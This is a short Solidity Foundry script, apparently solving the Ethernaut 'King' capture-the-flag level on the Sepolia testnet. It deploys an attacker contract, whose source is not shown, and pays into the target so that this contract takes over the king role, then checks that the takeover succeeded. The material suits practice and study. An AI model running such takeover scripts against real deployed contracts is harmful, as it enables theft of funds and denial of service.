// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Cracked9_King} from "../src/Cracked9_King.sol";
interface IKing {
    function _king() external view returns (address);
}

//forge script  --rpc-url sepolia --account metamask  Cracked9_KingScript --broadcast
contract Cracked9_KingScript is Script {
    address ethernaut_contracts;
    Cracked9_King king;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("King_address"));
    }

    function run() public {
        vm.startBroadcast();
        king = new Cracked9_King(ethernaut_contracts);
        console.log("oldKing is", IKing(ethernaut_contracts)._king());
        king.attach{value: 1000000000000001}();
        console.log("newKing is", IKing(ethernaut_contracts)._king());
        require(IKing(ethernaut_contracts)._king() == address(king), "fail");
        vm.stopBroadcast();
    }
}
